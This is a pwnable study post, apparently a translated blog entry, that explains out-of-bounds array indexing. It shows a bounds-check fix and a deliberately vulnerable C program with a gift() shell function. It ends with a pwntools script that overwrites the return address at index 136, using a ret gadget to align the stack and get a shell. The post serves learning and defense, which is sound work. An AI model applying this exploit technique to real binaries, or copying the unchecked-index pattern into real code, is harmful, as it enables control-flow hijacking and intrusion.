---
title: "[PWNABLE] Out Of Bounds"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value. This can be prevented by simply inserting the verification process code for the index during development. if (idx = 128) { printf(\"Invalid index!\\"
date: "2024-06-24"
translation_key: "tistory-58fe9a713fd6"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Out-Of-Bounds"
private: false
---

**※ If there are any mistakes, please let me know. We will make corrections after confirmation.** **※** 

Out of Bounds occurs when a negative number or a value outside the size of the array is entered as an array index value.

This can be prevented by simply inserting the verification process code for the index during development.

```
    if (idx < 0 || idx >= 128) {
        printf("Invalid index!\n");
        return;
    }
```

Let’s take a look at the example below.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
	printf("Hello! ZZoMblE");
	system("/bin/sh");
}
void initialize() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
	char buf[128];
	int idx = 0;
	printf("input idx : ");
	scanf("%d", &idx);

	printf("input change value : ");
	read(0, buf[idx],0x10);

}
int main() {
	initialize();
	vuln();
	return 0;
}
```

This time again, a vulnerability occurs in the input of vuln().

Since the user can write as many values ​​as 0x10 at the desired index position, Return Address Overflow can be performed if only the index of ret is calculated.

![](/assets/images/tistory/tistory-58fe9a713fd6/001.png)

0 is entered in idx.

Since ret and buf are separated by 136, you can find out that overwriting is possible at the ret location by entering 136 in idx.

I want to overwrite gift() in ret, but since the stack alignment is not correct in the current state, I write a ret gadget to match it.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

gift = e.sym['gift']
ret = 0x000000000040101a

payload = p64(ret)
payload += p64(gift)

p.sendlineafter(b': ',b'136')
p.sendafter(b':', payload)

p.interactive()
```

If you run it, you can see that the shell has been obtained.

![](/assets/images/tistory/tistory-58fe9a713fd6/002.png)